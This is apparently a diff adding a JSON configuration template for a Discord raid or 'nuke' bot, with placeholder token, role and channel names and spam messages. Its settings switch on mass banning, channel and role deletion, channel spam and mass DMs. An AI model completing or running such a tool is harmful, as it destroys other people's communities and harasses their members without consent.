@@ -1,0 +1,23 @@
+{
+    "prefix": "",
+    "botid": "",
+    "token": "",
+    "owner": "",
+
+    "bomb": {
+        "roles": ["role 1", "role 2", "role 3"],
+        "spamChannelText": "Message to be sent to channels",
+        "channelNames": ["channel 1", "channel 2", "channel 3"],
+        "dmText": "Message to be sent to members"
+    },
+
+    "advancedSettings": {
+        "ban": true,
+        "dm": true,
+        "channelDelete": true,
+        "channelCreate": true,
+        "roleDelete": true,
+        "roleCreate": true,
+        "channelSpam": true
+    }
+}
